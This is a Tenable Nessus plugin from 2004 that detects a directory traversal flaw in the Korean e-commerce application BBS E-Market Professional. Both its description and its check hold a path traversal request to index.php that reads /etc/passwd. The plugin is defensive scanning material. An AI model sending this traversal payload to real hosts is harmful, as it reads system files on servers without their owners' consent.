#
# (C) Tenable Network Security
#


if(description)
{
 script_id(14786);
 script_bugtraq_id(11191);
 script_version("$Revision: 1.3 $");
 name["english"] = "BBS E-Market File Disclosure";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running BBS E-Market Professional, a Korean Web-Based
e-commerce application written in PHP.

There is a flaw in the remote version of this software which may allow
an attacker to read arbitrary files on the remote host with the
privileges of the HTTP daemon by making the following request :

http://www.example.com/bemarket/shop/index.php?pargeurl=viewpage&filename=../../etc/passwd

Solution : Upgrade to version 1.4.0 of this software
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Directory Traversal Attempt";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");



port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if ( ! can_host_php(port:port) ) exit(0);


foreach dir (cgi_dirs()) 
 {
  req = http_get(item:dir + "/bemarket/shop/index.php?pageurl=viewpage&filename=../../../../../../../../../../../../../../etc/passwd", port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if ( res == NULL ) exit(0);
  if ( egrep(pattern:"root:.*:0:[01]:.*", string:res))
	{
	 security_hole(port);
	 exit(0);
	}
 }
